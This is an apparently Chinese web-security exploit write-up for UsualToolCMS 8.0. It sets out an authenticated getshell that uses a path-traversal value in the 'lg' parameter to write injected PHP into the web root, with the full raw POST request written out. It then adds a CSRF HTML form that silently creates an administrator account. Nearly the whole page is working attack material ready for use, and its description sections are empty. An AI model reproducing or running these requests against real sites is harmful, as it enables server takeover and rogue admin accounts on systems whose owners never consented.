<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="usualtoolcms-80-后台getshell"><span class="csDE05BCC">UsualToolcms 8.0 </span><span class="csECDA2D3">后台</span><span class="csDE05BCC">GETSHELL</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一、漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二、漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">UsualToolCMS-8.0-Release</span></p><h2 class="cs868C439D">
			<a name="三、复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">洞点</span><span class="cs8926E06">:<a class="cs508254C" href="http://0-sec.org/cmsadmin/a_lang.php"><span class="cs4B51D5E4">http://0-sec.org/cmsadmin/a_lang.php</span></a></span></p><p class="cs40DD2BC9"><span class="cs8926E06">13</span><span class="cs9C1B1871">行未对</span><span class="cs8926E06">$lg</span><span class="cs9C1B1871">做判断</span></p><p class="cs40DD2BC9"><span><img src="Web安全/UsualToolcms/UsualToolcms%208.0%20%e5%90%8e%e5%8f%b0GETSHELL_files/image0.png" width="560" height="292" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/UsualToolcms/UsualToolcms%208.0%20%e5%90%8e%e5%8f%b0GETSHELL_files/image1.png" width="560" height="331" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/UsualToolcms/UsualToolcms%208.0%20%e5%90%8e%e5%8f%b0GETSHELL_files/image2.png" width="560" height="341" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">点击保存时抓包需要修改</span><span class="cs8926E06">url</span><span class="cs9C1B1871">处的</span><span class="cs8926E06">lg</span><span class="cs9C1B1871">参数这样就上传到跟目录了，再在</span><span class="cs8926E06">post </span><span class="cs9C1B1871">参数的</span><span class="cs8926E06">en</span><span class="cs9C1B1871">后面加入</span></p><p class="cs3A447A38"><span class="cs9FB05234">en&quot;},&lt;?php phpinfo(); ?&gt;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/UsualToolcms/UsualToolcms%208.0%20%e5%90%8e%e5%8f%b0GETSHELL_files/image3.png" width="560" height="371" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/UsualToolcms/UsualToolcms%208.0%20%e5%90%8e%e5%8f%b0GETSHELL_files/image4.png" width="560" height="540" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/UsualToolcms/UsualToolcms%208.0%20%e5%90%8e%e5%8f%b0GETSHELL_files/image5.png" width="560" height="403" alt="" style="border-width:0px;" /></span></p><p class="cs3A447A38"><span class="cs9FB05234">POST /UsualToolCMS/cmsadmin/a_langx.php?x=m&amp;lg=../1.php HTTP/1.1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Host: 0-sec.org</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Accept-Encoding: gzip, deflate</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">DNT: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_langx.php?lg=lg-en.json</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Cookie: navleft=21; UTCMSLanguage=zh; PHPSESSID=1r5kk3jieflfbnseav3e5dnclo</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">X-Forwarded-For: 8.8.8.8</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Connection: close</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Upgrade-Insecure-Requests: 1</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Type: application/x-www-form-urlencoded</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">Content-Length: 9189</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">submit=</span><span class="cs7FFD2630">保存语言包</span><span class="cs9FB05234">&amp;keys[]=language&amp;values[]=en&quot;},&lt;?php phpinfo(); ?&gt;&amp;keys[]=charset&amp;values[]=utf-8&amp;keys[]=speak&amp;values[]=English&amp;keys[]=web&amp;values[]=UsualToolCMS&amp;key[]=index&amp;value[]=Home&amp;key[]=article&amp;value[]=Article&amp;key[]=product&amp;value[]=Product&amp;key[]=picture&amp;value[]=Picture&amp;key[]=atlas&amp;value[]=Atlas&amp;key[]=contact&amp;value[]=Contact&amp;key[]=about&amp;value[]=About&amp;key[]=forum&amp;value[]=Forum&amp;key[]=register&amp;value[]=Register&amp;key[]=login&amp;value[]=Login&amp;key[]=news&amp;value[]=News&amp;key[]=job&amp;value[]=Job&amp;key[]=wages&amp;value[]=Wages&amp;key[]=application&amp;value[]=Application&amp;key[]=resume&amp;value[]=Resume&amp;key[]=shopcart&amp;value[]=Shopcart&amp;key[]=account&amp;value[]=Account&amp;key[]=member&amp;value[]=Member&amp;key[]=up&amp;value[]=Up&amp;key[]=down&amp;value[]=Down&amp;key[]=more&amp;value[]=More&amp;key[]=new&amp;value[]=New&amp;key[]=authorize&amp;value[]=Authorize&amp;key[]=authenticating&amp;value[]=Authenticating&amp;key[]=qq&amp;value[]=QQ&amp;key[]=membercenter&amp;value[]=Member&amp;key[]=username&amp;value[]=Username&amp;key[]=password&amp;value[]=Password&amp;key[]=forgotpass&amp;value[]=Forgot&amp;key[]=search&amp;value[]=Search&amp;key[]=detail&amp;value[]=Detail&amp;key[]=size&amp;value[]=Size&amp;key[]=spec&amp;value[]=Spec&amp;key[]=color&amp;value[]=Color&amp;key[]=aboutus&amp;value[]=About Us&amp;key[]=newgoods&amp;value[]=New Product&amp;key[]=topgoods&amp;value[]=Top Product&amp;key[]=link&amp;value[]=Link&amp;key[]=confirm&amp;value[]=Confirm&amp;key[]=email&amp;value[]=Email&amp;key[]=title&amp;value[]=Title&amp;key[]=content&amp;value[]=Content&amp;key[]=avatar&amp;value[]=Avatar&amp;key[]=sex&amp;value[]=Sex&amp;key[]=man&amp;value[]=Man&amp;key[]=woman&amp;value[]=Woman&amp;key[]=address&amp;value[]=ADD.&amp;key[]=tel&amp;value[]=Tel&amp;key[]=fax&amp;value[]=Fax&amp;key[]=introduction&amp;value[]=Intro&amp;key[]=validatecode&amp;value[]=Captcha&amp;key[]=changeit&amp;value[]=Change it&amp;key[]=order&amp;value[]=Order&amp;key[]=writeorder&amp;value[]=Write Order&amp;key[]=menu&amp;value[]=Menu&amp;key[]=balance&amp;value[]=Balance&amp;key[]=level&amp;value[]=Level&amp;key[]=writearticles&amp;value[]=Write Articles&amp;key[]=articlemanagement&amp;value[]=Article Admin&amp;key[]=articlebrowse&amp;value[]=Article Browse&amp;key[]=writeonline&amp;value[]=Add New&amp;key[]=payment&amp;value[]=Payment&amp;key[]=registrationtime&amp;value[]=Reg Time&amp;key[]=lastlogintime&amp;value[]=Last Login&amp;key[]=fullname&amp;value[]=Full Name&amp;key[]=privileges:discount&amp;value[]=Privileges:Discount&amp;key[]=state&amp;value[]=State&amp;key[]=source&amp;value[]=Source&amp;key[]=ordernumber&amp;value[]=Order No.&amp;key[]=money&amp;value[]=Money&amp;key[]=time&amp;value[]=Time&amp;key[]=finish&amp;value[]=Finish&amp;key[]=unpaid&amp;value[]=Unpaid&amp;key[]=deliver&amp;value[]=Deliver&amp;key[]=refund&amp;value[]=Refund&amp;key[]=goods&amp;value[]=Goods&amp;key[]=charge&amp;value[]=Charge&amp;key[]=other&amp;value[]=Other&amp;key[]=ordertime&amp;value[]=Order Time&amp;key[]=voucher&amp;value[]=Voucher&amp;key[]=customer&amp;value[]=Customer&amp;key[]=zipcode&amp;value[]=Zip Code&amp;key[]=logistics&amp;value[]=Logistics&amp;key[]=logisticscompany&amp;value[]=Company&amp;key[]=logisticsnumber&amp;value[]=Number&amp;key[]=logisticsdetails&amp;value[]=Details&amp;key[]=paymentmethod&amp;value[]=Method&amp;key[]=alipay&amp;value[]=Alipay&amp;key[]=wechatpay&amp;value[]=Tencent Wechat&amp;key[]=paypal&amp;value[]=Paypal&amp;key[]=waitinganswer&amp;value[]=Waiting&amp;key[]=answered&amp;value[]=Answered&amp;key[]=question&amp;value[]=Question&amp;key[]=reply&amp;value[]=Reply&amp;key[]=tencentaccount&amp;value[]=Tencent&amp;key[]=weiboaccount&amp;value[]=Weibo&amp;key[]=wechataccount&amp;value[]=Wechat&amp;key[]=binded&amp;value[]=Binded&amp;key[]=untie&amp;value[]=Untie&amp;key[]=quantity&amp;value[]=Qty&amp;key[]=parameter&amp;value[]=Parm&amp;key[]=total&amp;value[]=Total&amp;key[]=submit&amp;value[]=Submit&amp;key[]=delete&amp;value[]=Del&amp;key[]=unit&amp;value[]=USD&amp;key[]=actual&amp;value[]=Actual&amp;key[]=feedback&amp;value[]=Feedback&amp;key[]=otheraccount&amp;value[]=Other Accounts&amp;key[]=out&amp;value[]=Out&amp;key[]=ranking&amp;value[]=Ranking&amp;key[]=recommend&amp;value[]=Recommend&amp;key[]=tag&amp;value[]=Tag&amp;key[]=tags&amp;value[]=Tags&amp;key[]=read&amp;value[]=Read&amp;key[]=productdetails&amp;value[]=Product Details&amp;key[]=service&amp;value[]=Service&amp;key[]=category&amp;value[]=Category&amp;key[]=allcategory&amp;value[]=All Category&amp;key[]=stock&amp;value[]=Stock&amp;key[]=price&amp;value[]=Price&amp;key[]=sale&amp;value[]=Sale&amp;key[]=loginview&amp;value[]=Login View&amp;key[]=readme&amp;value[]=Read Me&amp;key[]=popularity&amp;value[]=Popularity&amp;key[]=details&amp;value[]=Details&amp;key[]=message&amp;value[]=Message&amp;key[]=original&amp;value[]=Original&amp;key[]=author&amp;value[]=Author&amp;key[]=pass&amp;value[]=Pass&amp;key[]=audit&amp;value[]=Audit&amp;key[]=return&amp;value[]=Return&amp;key[]=yes&amp;value[]=Yes&amp;key[]=no&amp;value[]=No&amp;key[]=modify&amp;value[]=Modify&amp;key[]=articlemodify&amp;value[]=Article Modify&amp;key[]=type&amp;value[]=Type&amp;key[]=moreupload&amp;value[]=Up to upload&amp;key[]=success&amp;value[]=Success&amp;key[]=fail&amp;value[]=Fail&amp;key[]=upload&amp;value[]=Upload&amp;key[]=uploadtime&amp;value[]=Upload Time&amp;key[]=contactus&amp;value[]=Contact Us&amp;key[]=previouspage&amp;value[]=Prev&amp;key[]=nextpage&amp;value[]=Next&amp;key[]=firstpage&amp;value[]=First&amp;key[]=lastpage&amp;value[]=Last&amp;key[]=totalpage&amp;value[]=Total&amp;key[]=currentpage&amp;value[]=Current&amp;key[]=buy&amp;value[]=Buy&amp;key[]=mailverify&amp;value[]=Email validation&amp;key[]=welcome&amp;value[]=Welcome&amp;key[]=close&amp;value[]=closed&amp;key[]=findpassword&amp;value[]=Find Password&amp;key[]=contactmanager&amp;value[]=Contact Manager&amp;key[]=orderdetaillogin&amp;value[]=For order details,please visit the website.&amp;key[]=enterusername&amp;value[]=Please enter username!&amp;key[]=enterpassword&amp;value[]=Please enter password!&amp;key[]=enteremail&amp;value[]=Please enter Email!&amp;key[]=emailerr&amp;value[]=Email error!&amp;key[]=entertitle&amp;value[]=Please enter title!&amp;key[]=entercontent&amp;value[]=Please enter content!&amp;key[]=selecttype&amp;value[]=Type must be selected!&amp;key[]=enterauthor&amp;value[]=Please enter author!&amp;key[]=enterpasswords&amp;value[]=Please confirm the password!&amp;key[]=passworderr&amp;value[]=The codes don&amp;key[]=entercaptcha&amp;value[]=Please enter captcha!&amp;key[]=captchaerr&amp;value[]=Captcha error!&amp;key[]=mailsenderr&amp;value[]=Mail not sent!&amp;key[]=mailok&amp;value[]=Please check email!&amp;key[]=pleasemailverify&amp;value[]=Please check email for verification!&amp;key[]=mailverifycode&amp;value[]=Email Authentication Code&amp;key[]=mailcopylink&amp;value[]=Please copy the following link&amp;key[]=totalnum&amp;value[]=Total Num&amp;key[]=updateok&amp;value[]=Update successed!&amp;key[]=updateno&amp;value[]=Failed to update!&amp;key[]=payok&amp;value[]=Successful payment!&amp;key[]=payno&amp;value[]=Payment Failed!&amp;key[]=createempty&amp;value[]=Required field is empty!&amp;key[]=createok&amp;value[]=Create successed!&amp;key[]=createno&amp;value[]=Failed to create!&amp;key[]=gotopay&amp;value[]=Go to pay!&amp;key[]=untieok&amp;value[]=Untie successed!&amp;key[]=untieno&amp;value[]=Untie failed!&amp;key[]=delok&amp;value[]=Delete successed!&amp;key[]=delno&amp;value[]=Delete failed!&amp;key[]=regclose&amp;value[]=Website registration closed!&amp;key[]=regmailerr&amp;value[]=Account or email registered!&amp;key[]=loginusererr&amp;value[]=Account does not exist!&amp;key[]=loginpasserr&amp;value[]=Account or password does not match!&amp;key[]=administratorreply&amp;value[]=The administrator has not responded, please wait patiently.&amp;key[]=noscript&amp;value[]=Sorry, your browser disabled JavaScript, it may not be able to use some of the site&amp;key[]=readmecontent&amp;value[]=We guarantee that the outer packing of the goods is in good condition at the time of shipment. When you receive the goods, please carefully check whether the invoice and the goods are consistent with the delivery order. If you find that the goods are missing or damaged, please contact our customer service department on the spot when the delivery personnel are still on the scene; If you find that the package is damaged or the goods are damaged in transit, please point out and refuse to accept it on the spot. After refusal, please call our customer service. If you have signed for it or someone else has signed for it, you will be considered as the packaging, quantity and content of the goods. I will not be able to accept.&amp;key[]=copyright&amp;value[]=Copyright&amp;key[]=cssdisplay&amp;value[]=none&amp;key[]=test&amp;value[]=Test</span></p><p class="cs3A447A38"><span class="cs7FFD2630">请将上面</span><span class="cs9FB05234">post</span><span class="cs7FFD2630">数据包内容进行</span><span class="cs9FB05234">url</span><span class="cs7FFD2630">编码</span></p><h3 class="cs868C439D">
			<a name="csrf配合上面的后台getshell"><span class="csD1E291E2">csrf</span><span class="csD6CA00D2">配合上面的后台</span><span class="csD1E291E2">getshell</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">&lt;html&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&lt;body&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&lt;form action=&quot;http://0-sec.org/cmsadmin/a_adminx.php?x=a&quot; method=&quot;POST&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;safetest&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=&quot;hidden&quot; name=&quot;roleid&quot; value=&quot;1&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;123456&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=&quot;hidden&quot; name=&quot;password&amp;#95;confirm&quot; value=&quot;123456&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=&quot;hidden&quot; name=&quot;submit&quot; value=&quot;&aelig;&amp;#143;&amp;#144;&auml;&ordm;&amp;#164;&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/form&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&lt;/body&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/html&gt;</span></p><p class="cs40DD2BC9"><span class="cs8926E06">&nbsp;</span></p></body>
</html>
